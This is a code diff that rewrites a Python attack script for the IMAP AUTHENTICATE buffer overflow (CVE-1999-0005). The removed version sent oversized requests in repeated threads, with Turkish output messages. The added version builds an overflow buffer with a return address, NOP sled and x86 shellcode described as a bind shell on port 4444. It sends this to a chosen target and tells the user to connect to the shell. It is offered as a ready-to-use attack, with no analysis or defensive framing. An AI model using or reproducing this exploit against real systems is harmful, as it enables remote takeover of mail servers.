@@ -1,72 +1,47 @@
+#!/usr/bin/env python3
+# CVE-1999-0005 - Remote IMAP Authenticate Buffer Overflow Exploit
+
 import socket
-import argparse
-import time
-import threading
-from queue import Queue
 import struct
+import argparse
 
-# CVE-1999-0005: Arbitrary command execution via IMAP buffer overflow in authenticate command.
-# This vulnerability allows remote attackers to execute arbitrary commands by exploiting a buffer overflow in the IMAP authenticate command.
+# Linux x86 bind shell on port 4444
+SHELLCODE = (
+    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
+    b"\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x68\x7f\x00"
+    b"\x00\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1"
+    b"\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
+    b"\x05\x6a\x00\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f"
+    b"\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+    b"\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
 
-def create_payload(target_host):
-    # Example payload to exploit the IMAP authenticate buffer overflow vulnerability
-    overflow_payload = b"A" * 2048  # Crafted payload to trigger buffer overflow
-    imap_command = b"a001 AUTHENTICATE {" + overflow_payload + b"}\r\n"
-    return imap_command
+def build_payload():
+    padding = b"A" * 260
+    ret_addr = struct.pack("<I", 0xbffff7c0)  # adjust to match stack address in real environment
+    buffer = padding + ret_addr * 4 + b"\x90" * 100 + SHELLCODE
+    return buffer
 
-def send_payload(target_host, target_port, verbose):
-    payload = create_payload(target_host)
+def exploit_imap(target_ip, port, payload):
     try:
-        with socket.create_connection((target_host, target_port), timeout=10) as sock:
-            sock.sendall(payload)
-            if verbose:
-                print(f"[+] Paket gönderildi: {target_host}:{target_port}")
-    except socket.timeout:
-        if verbose:
-            print("[-] Zaman aşımı!")
-    except socket.error as e:
-        if verbose:
-            print(f"[-] Bağlantı hatası: {e}")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, port))
+        banner = s.recv(1024)
+        s.send(b'A001 AUTHENTICATE ' + payload + b'\r\n')
+        print(f"[+] Payload sent to {target_ip}:{port}")
+        print("[+] If successful, connect to target on port 4444")
+        s.close()
+    except Exception as e:
+        print(f"[!] Exploit failed: {e}")
 
-def worker(queue, verbose):
-    while not queue.empty():
-        target_host, target_port = queue.get()
-        send_payload(target_host, target_port, verbose)
-        queue.task_done()
-
-def main(target_host, target_port, thread_count, retries, verbose):
-    for attempt in range(retries):
-        queue = Queue()
-        for _ in range(thread_count):
-            queue.put((target_host, target_port))
-
-        threads = []
-        for _ in range(thread_count):
-            t = threading.Thread(target=worker, args=(queue, verbose))
-            t.start()
-            threads.append(t)
-
-        for t in threads:
-            t.join()
-
-        if queue.empty():
-            break
-        elif attempt < retries - 1:
-            time.sleep(3)
-            if verbose:
-                print(f"[i] Tekrar deneme: {attempt + 2}/{retries}")
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="IMAP Buffer Overflow Exploit (CVE-1999-0005)")
-    parser.add_argument("-t", "--target", required=True, help="Hedef sunucu IP adresi veya hostname")
-    parser.add_argument("-p", "--port", type=int, default=143, help="Hedef sunucu portu (varsayılan: 143, IMAP için)")
-    parser.add_argument("-i", "--threads", type=int, default=10, help="İş parçacığı sayısı (varsayılan: 10)")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
-    parser.add_argument("--retries", type=int, default=3, help="Başarısız bağlantılar için tekrar deneme sayısı (varsayılan: 3)")
-    
+def main():
+    parser = argparse.ArgumentParser(description="CVE-1999-0005 - IMAP AUTHENTICATE Command Buffer Overflow Exploit")
+    parser.add_argument("-t", "--target", required=True, help="Target IP address")
+    parser.add_argument("-p", "--port", type=int, default=143, help="IMAP port (default: 143)")
     args = parser.parse_args()
 
-    if args.verbose:
-        print(f"[i] Hedef: {args.target}, Port: {args.port}, Retries: {args.retries}, İş Parçacığı: {args.threads}")
+    payload = build_payload()
+    exploit_imap(args.target, args.port, payload)
 
-    main(args.target, args.port, args.threads, args.retries, args.verbose)
+if __name__ == "__main__":
+    main()
